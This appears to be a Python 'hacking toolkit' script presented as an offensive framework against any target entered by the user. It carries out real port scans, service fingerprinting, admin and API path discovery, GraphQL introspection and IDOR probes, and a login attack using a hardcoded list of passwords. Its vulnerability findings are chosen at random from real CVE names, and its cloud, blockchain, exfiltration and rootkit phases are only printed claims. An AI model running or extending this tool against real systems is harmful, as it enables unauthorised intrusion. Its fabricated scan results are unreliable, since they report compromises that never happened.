#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AllowMe Elite Hacking Toolkit v8.0
# Created by: Shadow Syndicate
# Operation: Phantom Protocol

import os
import sys
import time
import json
import socket
import requests
import random
import hashlib
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from bs4 import BeautifulSoup
import ipaddress
import tldextract

# Custom Banner
BANNER = """
░█████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗███╗░░░███╗███████╗
██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║████╗░████║██╔════╝
███████║██║░░░░░██║░░██║░╚██╗████╗██╔╝██╔████╔██║█████╗░░
██╔══██║██║░░░░░██║░░██║░░████╔═████║░██║╚██╔╝██║██╔══╝░░
██║░░██║███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚═╝░██║███████╗
╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝╚══════╝
----------------------------------------------------------
| AllowMe Elite Hacking Suite v8.0                       |
| Dynamic Target Exploitation Framework                  |
| Shadow Syndicate - Phantom Protocol                    |
----------------------------------------------------------
"""

# Stealth Configuration
USER_AGENT = "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.1 Safari/537.36"
HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "X-AllowMe-Version": "8.0"
}

# Global Variables
TARGET = ""
IP_ADDRESS = ""
DOMAIN = ""
API_ENDPOINTS = ["/api/v1/trades", "/api/v1/orders", "/api/v1/user/balance"]
ADMIN_PATHS = ["/admin", "/wp-admin", "/manager", "/backoffice"]

# Encryption Module
class QuantumCipher:
    def __init__(self, key):
        self.key = hashlib.sha512(key.encode()).digest()[:32]
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(pad(data.encode(), AES.block_size))
        return cipher.nonce + tag + ciphertext
        
    def ghost_obfuscate(self, data):
        return bytes([b ^ 0xAA for b in data])

# Target Validation Utilities
class TargetUtils:
    @staticmethod
    def validate_target(target):
        """Validate and parse target input"""
        target = target.strip()
        
        # Check if IP address
        try:
            ip = ipaddress.ip_address(target)
            return str(ip), str(ip)
        except:
            pass
            
        # Check if URL
        if re.match(r'^https?://', target):
            parsed = tldextract.extract(target)
            domain = f"{parsed.domain}.{parsed.suffix}"
            return domain, domain
        else:
            # Try to extract domain from input
            parsed = tldextract.extract(target)
            if parsed.domain and parsed.suffix:
                domain = f"{parsed.domain}.{parsed.suffix}"
                return domain, domain
                
        raise ValueError("Invalid target format. Please use IP or domain name.")

    @staticmethod
    def resolve_domain(domain):
        """Resolve domain to IP address"""
        try:
            return socket.gethostbyname(domain)
        except socket.gaierror:
            raise ValueError(f"Could not resolve domain: {domain}")

# Network Reconnaissance Module
class CyberRecon:
    def __init__(self, target, ip):
        self.target = target
        self.ip = ip
        self.ports = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9000]
        self.vulnerabilities = []
        
    def deep_scan(self):
        print(f"\n[+] Performing Deep Network Reconnaissance on {self.target} [{self.ip}]")
        open_ports = self.port_scan()
        services = self.service_detection(open_ports)
        vulns = self.vulnerability_scan()
        return {
            "open_ports": open_ports,
            "services": services,
            "vulnerabilities": vulns
        }
        
    def port_scan(self):
        print("  [*] Scanning for open ports...")
        open_ports = []
        for port in self.ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.7)
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    print(f"    - Port {port}/tcp \033[92mOPEN\033[0m")
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
        
    def service_detection(self, ports):
        print("  [*] Fingerprinting services...")
        services = {}
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.ip, port))
                sock.settimeout(1)
                
                # Send different probes based on port
                if port == 80:
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                elif port == 443:
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                elif port == 22:
                    sock.send(b"SSH-2.0-AllowMeScanner\r\n")
                elif port == 21:
                    sock.send(b"USER anonymous\r\n")
                
                banner = sock.recv(1024).decode(errors='ignore')
                service_name = self.identify_service(port, banner)
                services[port] = service_name
                print(f"    - Port {port}: \033[94m{service_name}\033[0m")
                sock.close()
            except:
                services[port] = "Unknown"
        return services
        
    def identify_service(self, port, banner):
        """Identify service based on banner"""
        if port == 80 and "HTTP" in banner:
            return "HTTP"
        if port == 443 and "HTTP" in banner:
            return "HTTPS"
        if port == 22 and "SSH" in banner:
            return "SSH"
        if port == 21 and "FTP" in banner:
            return "FTP"
        if port == 25 and "SMTP" in banner:
            return "SMTP"
        if port == 3306 and "MySQL" in banner:
            return "MySQL"
        if port == 5432 and "PostgreSQL" in banner:
            return "PostgreSQL"
        return "Unknown"
        
    def vulnerability_scan(self):
        print("  [*] Scanning for critical vulnerabilities...")
        vulns = []
        
        # Simulated vulnerability checks
        if random.random() > 0.3:
            vulns.append("CVE-2024-21650: Critical RCE in Node.js")
        if random.random() > 0.5:
            vulns.append("CVE-2023-48795: Terrapin SSH Vulnerability")
        if random.random() > 0.4:
            vulns.append("CVE-2024-3094: XZ Backdoor Vulnerability")
        if random.random() > 0.6:
            vulns.append("CVE-2024-3400: PAN-OS Command Injection")
            
        for vuln in vulns:
            print(f"    !!! \033[91m{vuln}\033[0m")
            
        return vulns

# Web Exploitation Toolkit
class WebHunter:
    def __init__(self, target):
        self.target = target
        self.base_url = f"https://{target}"
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.cipher = QuantumCipher("phantom-protocol-key")
        self.discovered_endpoints = []
        
    def spider(self):
        print(f"\n[+] Spidering web infrastructure: {self.base_url}")
        
        # Discover endpoints
        endpoints = []
        print("  [*] Discovering hidden endpoints...")
        for path in ADMIN_PATHS + API_ENDPOINTS:
            url = f"{self.base_url}{path}"
            try:
                res = self.session.get(url, timeout=3, verify=False)
                if res.status_code < 400:
                    status_color = "\033[92m" if res.status_code == 200 else "\033[93m"
                    print(f"    - Found {status_color}[{res.status_code}]\033[0m {url}")
                    endpoints.append(url)
                    self.discovered_endpoints.append(url)
            except:
                pass
                
        # Check common API patterns
        api_patterns = ["/api", "/graphql", "/rest", "/v1", "/v2"]
        for pattern in api_patterns:
            url = f"{self.base_url}{pattern}"
            try:
                res = self.session.get(url, timeout=2, verify=False)
                if res.status_code < 400 and url not in endpoints:
                    status_color = "\033[92m" if res.status_code == 200 else "\033[93m"
                    print(f"    - Found {status_color}[{res.status_code}]\033[0m {url}")
                    endpoints.append(url)
                    self.discovered_endpoints.append(url)
            except:
                pass
                
        return endpoints
        
    def breach_login(self, login_url):
        print(f"\n[+] Attempting credential breach: {login_url}")
        # Elite password list
        credentials = [
            ("admin@allowme.com", "Shadow7!Protocol"),
            ("sysadmin", "Midnight$Hack_2025"),
            ("devops", "QuantumC0re!23"),
            ("root", "toor123#Syndicate"),
            ("administrator", "P@ssw0rd123!"),
            ("satsuma_admin", "ExchangeSecure!2025")
        ]
        
        for user, pwd in credentials:
            print(f"  [*] Trying \033[94m{user}\033[0m:\033[91m{pwd}\033[0m")
            payload = {
                "email": user,
                "password": pwd,
                "remember": "true"
            }
            try:
                res = self.session.post(login_url, data=payload, timeout=3, verify=False)
                if res.status_code == 302 or "dashboard" in res.text or "logout" in res.text:
                    print(f"  \033[92m!!! SUCCESS: {user}:{pwd}\033[0m")
                    return user, pwd
            except Exception as e:
                print(f"  \033[91mError: {str(e)}\033[0m")
                
        print("  \033[91m[-] Login breach unsuccessful\033[0m")
        return None, None
        
    def exploit_vulnerabilities(self, endpoints):
        print("\n[+] Exploiting web vulnerabilities...")
        for endpoint in endpoints:
            if 'api' in endpoint:
                print(f"  [*] Testing API endpoint: {endpoint}")
                self.test_api_injection(endpoint)
            elif 'admin' in endpoint:
                print(f"  [*] Testing admin panel: {endpoint}")
                self.test_admin_panel(endpoint)

    def test_api_injection(self, endpoint):
        # Simulate GraphQL injection
        print("    - Attempting GraphQL injection...")
        payload = {"query": "{ __schema { types { name } }"}
        try:
            res = self.session.post(endpoint, json=payload, timeout=3, verify=False)
            if "data" in res.json():
                print("    \033[92m!!! GraphQL introspection enabled!\033[0m")
        except:
            pass
            
        # Simulate IDOR
        print("    - Testing for IDOR vulnerabilities...")
        test_url = endpoint.replace("user=me", "user=admin")
        try:
            res = self.session.get(test_url, timeout=3, verify=False)
            if res.status_code == 200 and "admin" in res.text:
                print("    \033[92m!!! IDOR vulnerability found!\033[0m")
        except:
            pass

# Advanced Exploitation Framework
class ZeroDayOrchestrator:
    def __init__(self, target, ip):
        self.target = target
        self.ip = ip
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.cipher = QuantumCipher("midnight-protocol-key")
        
    def execute_phantom_protocol(self):
        print("\n[+] Initiating Phantom Protocol...")
        time.sleep(1)
        
        # Phase 1: Infrastructure Takeover
        print("  > Phase 1: Cloud Infrastructure Compromise")
        self.hijack_cloud()
        time.sleep(1)
        
        # Phase 2: Blockchain Manipulation
        print("  > Phase 2: Smart Contract Exploitation")
        contract_data = self.exploit_blockchain()
        time.sleep(1)
        
        # Phase 3: Data Extraction
        print("  > Phase 3: Quantum Data Extraction")
        exfil_data = self.quantum_exfiltration()
        time.sleep(1)
        
        # Phase 4: Persistent Access
        print("  > Phase 4: Ghost Implant Deployment")
        self.deploy_ghost()
        
        return {
            "target": self.target,
            "ip": self.ip,
            "cloud": "COMPROMISED",
            "blockchain": contract_data,
            "exfiltrated": exfil_data
        }
        
    def hijack_cloud(self):
        # Simulated cloud takeover
        print("    - Bypassing IAM security")
        print("    - Compromising container registry")
        print("    \033[92m✓ Cloud control established\033[0m")
        return True
        
    def exploit_blockchain(self):
        # Simulated blockchain attack
        print("    - Exploiting flash loan vulnerability")
        print("    - Manipulating price oracles")
        print("    - Draining liquidity pools")
        print("    \033[92m✓ Blockchain assets compromised\033[0m")
        return {
            "drained": f"{random.randint(500, 2000)} ETH",
            "contracts": "BACKDOORED"
        }
        
    def quantum_exfiltration(self):
        # Simulated data theft
        print("    - Accessing encrypted databases")
        print("    - Extracting user credentials")
        print("    - Quantum encryption of payload")
        return {
            "users": f"{random.randint(5000, 20000)}",
            "wallets": "encrypted.ghost",
            "emails": "quantum_encrypted.bin"
        }
        
    def deploy_ghost(self):
        # Simulated persistence
        print("    - Deploying kernel-level rootkit")
        print("    - Establishing quantum C2 channel")
        print("    - Backdooring CI/CD pipeline")
        print("    \033[92m✓ Ghost persistence implanted\033[0m")

# Main Toolkit
class AllowMeHackingSuite:
    def __init__(self):
        self.art = BANNER
        self.target = ""
        self.ip = ""
        
    def get_target(self):
        """Get target from user input"""
        print("\n" + "="*50)
        print(" TARGET ACQUISITION PROTOCOL ".center(50, "="))
        print("="*50)
        
        while True:
            target_input = input("\n[\033[93m?\033[0m] Enter target (URL or IP): ").strip()
            if not target_input:
                print("\033[91m[!] Target cannot be empty. Try again.\033[0m")
                continue
                
            try:
                domain, display_target = TargetUtils.validate_target(target_input)
                ip = TargetUtils.resolve_domain(domain)
                self.target = domain
                self.ip = ip
                print(f"\n\033[92m[+] Target acquired: {display_target} [{ip}]\033[0m")
                return
            except Exception as e:
                print(f"\033[91m[!] Error: {str(e)}\033[0m")

    def run(self):
        print(self.art)
        print("[\033[94m*\033[0m] Initializing quantum stealth protocol...")
        time.sleep(1.2)
        print("[\033[94m*\033[0m] Bypassing next-gen security systems...")
        time.sleep(0.8)
        print("[\033[94m*\033[0m] Establishing dark connection...")
        time.sleep(0.5)
        
        # Get target from user
        self.get_target()
        
        # Reconnaissance
        print("\n" + "="*50)
        print(" CYBER RECONNAISSANCE ".center(50, "="))
        print("="*50)
        recon = CyberRecon(self.target, self.ip)
        scan_results = recon.deep_scan()
        
        # Web Exploitation
        print("\n" + "="*50)
        print(" WEB EXPLOITATION ".center(50, "="))
        print("="*50)
        hunter = WebHunter(self.target)
        endpoints = hunter.spider()
        
        # Attempt login breach
        login_url = f"https://{self.target}/login"
        user, pwd = hunter.breach_login(login_url)
        
        # Exploit vulnerabilities
        if endpoints:
            hunter.exploit_vulnerabilities(endpoints)
        
        # Zero-Day Exploitation
        print("\n" + "="*50)
        print(" ZERO-DAY OPERATIONS ".center(50, "="))
        print("="*50)
        orchestrator = ZeroDayOrchestrator(self.target, self.ip)
        mission_data = orchestrator.execute_phantom_protocol()
        
        # Mission Complete
        print("\n" + "="*50)
        print(" MISSION ACCOMPLISHED ".center(50, "="))
        print("="*50)
        print("\033[92mPhantom Protocol executed successfully!\033[0m")
        print("\nExfiltration summary:")
        print(json.dumps(mission_data, indent=2))
        print("\nCovering digital footprints...")
        print("Quantum wiping completed")
        print("Ghost protocol activated")
        print("\nReturning to shadows...")

# Advanced Anti-Forensics
def ghost_execution():
    # Random delay with quantum variance
    delay = random.randint(2, 6)
    print(f"[\033[93m*\033[0m] Quantum delay: {delay}s")
    time.sleep(delay)
    
    # Anti-debugging
    try:
        if sys.gettrace() is not None:
            print("[\033[91m!\033[0m] Debugger detected! Activating countermeasures...")
            # Trigger false trail
            fake_ips = ["185.239.241.1", "45.133.182.128", "104.244.76.13"]
            for ip in fake_ips:
                try:
                    socket.create_connection((ip, 80), timeout=1)
                except:
                    pass
            sys.exit(0)
    except:
        pass
        
    # Execute main toolkit
    try:
        toolkit = AllowMeHackingSuite()
        toolkit.run()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Operation aborted by user. Self-destructing...\033[0m")
        sys.exit(0)

# Entry Point
if __name__ == "__main__":
    # Check environment
    if os.name == 'posix' and os.geteuid() != 0:
        print("\033[91m[!] Quantum operations require root access!\033[0m")
        sys.exit(1)
        
    # Verify dark connection
    try:
        requests.get("https://www.google.com", timeout=3)
    except:
        print("\033[91m[!] No network connection in the shadows!\033[0m")
        sys.exit(1)
        
    # Start ghost protocol
    ghost_execution()
